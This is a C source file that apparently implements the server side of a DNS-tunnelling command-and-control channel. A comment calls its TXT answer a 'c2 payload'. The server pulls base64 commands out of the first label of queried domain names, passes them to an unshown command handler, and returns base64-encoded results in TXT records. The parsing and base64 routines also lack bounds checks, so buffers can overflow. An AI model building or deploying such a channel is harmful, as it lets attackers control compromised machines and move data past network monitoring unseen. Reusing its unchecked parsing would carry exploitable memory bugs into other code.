#include "listener.h"

int main()
{
    int sockfd;
    struct sockaddr_in server_addr, client_addr; // Store client & server ip addr
    char buffer[MAX_BUFFER_SIZE];                // Store incoming data
    socklen_t addr_len = sizeof(client_addr);

    memset(&server_addr, 0, sizeof(server_addr));
    memset(&client_addr, 0, sizeof(client_addr));

    // Allocate resources for network endpoint.
    // IPv4, UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("Socket Creation Failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Accept connections from any IP
    server_addr.sin_port = htons(PORT);                   // Listen on port

    // Bind port for listening
    if ((bind(sockfd, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0))
    {

        perror("Port Binding failed.");
        exit(EXIT_FAILURE);
    }
    else
    {
        printf("Port %d successfully binded.\n", PORT);
    }

    printf("Listening on port %d for UDP packets..", PORT);

    while (TRUE)
    {
        // Wait until data packet, write from sockfd file to buffer
        int n = recvfrom(sockfd, (char *)buffer, MAX_BUFFER_SIZE, MSG_WAITALL, (struct sockaddr *)&client_addr, &addr_len);
        if (n < 0)
        {
            perror("Recv failed");
            continue;
        }
        buffer[n] = '\0';

        // Packet Recived
        printf("\nRecived packet from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        struct dns_packet packet;
        parse_dns_packet(buffer, &packet);

        printf("ID: 0x%X | Domain: %s | Type: %d\n",
               ntohs(packet.header.id),
               packet.question.name,
               packet.question.qtype);

        // After reciving packet and parsing it, return valid response back to client
        send_response(sockfd, buffer, n, &packet, &client_addr, addr_len);
    }

    return 0;
}

void parse_dns_packet(char *buffer, struct dns_packet *packet)
{
    struct dns_header *raw_header = (struct dns_header *)buffer;
    packet->header = *raw_header; // Copy header

    char *reader = buffer + sizeof(struct dns_header);

    // Parse the QNAME
    int i = 0;
    while (*reader != 0 && i < 255)
    {
        int length = *reader;
        reader++;

        for (int j = 0; j < length && i < 255; j++)
        {
            packet->question.name[i++] = *reader;
            reader++;
        }
        packet->question.name[i++] = '.'; // Add dot separator
    }

    packet->question.name[i - 1] = '\0';

    // Parse Qtype & Qclass
    // QTYPE is 2 bytes after the QNAME
    reader++;

    unsigned short *qtype_ptr = (unsigned short *)reader;
    packet->question.qtype = ntohs(*qtype_ptr);

    // QCLASS is 2 bytes after QTYPE
    reader += 2;
    unsigned short *qclass_ptr = (unsigned short *)reader;
    packet->question.qclass = ntohs(*qclass_ptr);
};

void send_response(int sockfd, char *request_buffer, int request_len, struct dns_packet *parsed_packet, struct sockaddr_in *client_addr, socklen_t addr_len)
{
    char reply_buffer[MAX_BUFFER_SIZE];
    memset(reply_buffer, 0, MAX_BUFFER_SIZE);

    // --- HEADER ---
    struct dns_header *reply_header = (struct dns_header *)reply_buffer;
    *reply_header = parsed_packet->header; // Copy ID and flags
    reply_header->flags = htons(0x8180);   // Standard Response, No Error
    reply_header->ans_count = htons(1);    // 1 Answer
    reply_header->auth_count = 0;
    reply_header->add_count = 0;

    // --- QUESTION SECTION ---
    char *q_ptr = request_buffer + DNS_HEADER_SIZE; // find length of original question section
    while (*q_ptr != 0)
        q_ptr += (*q_ptr) + 1; // Skip labels
    q_ptr += 1 + 2 + 2;        // Skip Null byte, QType(2), QClass(2)

    int q_len = q_ptr - (request_buffer + DNS_HEADER_SIZE);
    memcpy(reply_buffer + DNS_HEADER_SIZE, request_buffer + DNS_HEADER_SIZE, q_len);

    // --- TXT Record for c2 payload ---
    struct dns_answer *answer = (struct dns_answer *)(reply_buffer + DNS_HEADER_SIZE + q_len);

    // Payload Data
    char txt_data[256];
    char response[1024];
    char encoded_response[2048];

    extractPayload(parsed_packet->question.name, txt_data);
    char *decoded_payload = base64_decode(txt_data);
    handleCommand(decoded_payload, response);

    char *encoded = base64_encode(response);
    strcpy(encoded_response, encoded);
    free(encoded);

    int txt_len = strlen(encoded_response);
    free(decoded_payload);

    answer->name = htons(0xC00C); // Pointer to question name
    answer->qtype = htons(16);    // TXT
    answer->qclass = htons(1);    // Class IN
    answer->ttl = htonl(20);      // TTL 20s
    answer->data_len = htons(txt_len + 1);

    // Fill RDATA
    char *rdata = (char *)answer + sizeof(struct dns_answer);
    *rdata = (unsigned char)txt_len;              // First byte is length
    memcpy(rdata + 1, encoded_response, txt_len); // Then the string

    int total_len = DNS_HEADER_SIZE + q_len + sizeof(struct dns_answer) + txt_len + 1;
    sendto(sockfd, reply_buffer, total_len, 0, (struct sockaddr *)client_addr, addr_len);

    printf("Sent TXT response (%d bytes)\n", total_len);
}

int extractPayload(char *qname, char *payload)
{
    char *reader = qname;
    for (int i = 0; i < strlen(qname); i++)
    {
        if (*reader == '.')
        {
            // Extract payload
            int len = reader - qname;
            // Copy payload to output
            strncpy(payload, qname, len);
            payload[len] = '\0';
            return len;
        }
        reader++;
    }
    return 0; // Not found
}

char base64_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};

char *base64_decode(char *cipher)
{

    int counts = 0;
    char buffer[4];
    char *plain = malloc(strlen(cipher) * 3 / 4);
    int i = 0, p = 0;

    for (i = 0; cipher[i] != '\0'; i++)
    {
        int k;
        for (k = 0; k < 64 && base64_map[k] != cipher[i]; k++)
            ;
        buffer[counts++] = k;
        if (counts == 4)
        {
            plain[p++] = (buffer[0] << 2) + (buffer[1] >> 4);
            if (buffer[2] != 64)
                plain[p++] = (buffer[1] << 4) + (buffer[2] >> 2);
            if (buffer[3] != 64)
                plain[p++] = (buffer[2] << 6) + buffer[3];
            counts = 0;
        }
    }

    plain[p] = '\0'; /* string padding character */
    return plain;
}

char *base64_encode(char *plain)
{

    int counts = 0;
    char buffer[3];
    char *cipher = malloc(strlen(plain) * 4 / 3 + 4);
    int i = 0, c = 0;

    for (i = 0; plain[i] != '\0'; i++)
    {
        buffer[counts++] = plain[i];
        if (counts == 3)
        {
            cipher[c++] = base64_map[buffer[0] >> 2];
            cipher[c++] = base64_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
            cipher[c++] = base64_map[((buffer[1] & 0x0f) << 2) + (buffer[2] >> 6)];
            cipher[c++] = base64_map[buffer[2] & 0x3f];
            counts = 0;
        }
    }

    if (counts > 0)
    {
        cipher[c++] = base64_map[buffer[0] >> 2];
        if (counts == 1)
        {
            cipher[c++] = base64_map[(buffer[0] & 0x03) << 4];
            cipher[c++] = '=';
        }
        else
        { // if counts == 2
            cipher[c++] = base64_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
            cipher[c++] = base64_map[(buffer[1] & 0x0f) << 2];
        }
        cipher[c++] = '=';
    }

    cipher[c] = '\0'; /* string padding character */
    return cipher;
}